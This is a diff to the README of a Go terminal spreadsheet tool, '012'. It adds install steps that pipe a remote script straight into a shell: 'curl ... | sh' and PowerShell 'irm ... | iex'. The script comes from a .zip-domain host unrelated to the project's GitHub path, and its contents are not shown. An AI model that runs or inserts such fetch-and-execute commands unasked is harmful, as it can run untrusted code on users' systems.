@@ -15,8 +15,11 @@ It is one pure-Go binary.
 ## Install
 
 ```sh
-go install github.com/FelineStateMachine/012/cmd/012@latest
+curl -fsSL https://f58b.n.zip/install.sh | sh              # macOS, Linux: into ~/.local/bin
+go install github.com/FelineStateMachine/012/cmd/012@latest  # or build it with Go 1.27
 ```
+
+On Windows, `irm https://f58b.n.zip/install.ps1 | iex` in PowerShell.
 
 Then run `012`, or `012 budget.012` to open a sheet. F1 shows every
 shortcut, F10 or Alt+letter opens the menus, and Ctrl+K searches every
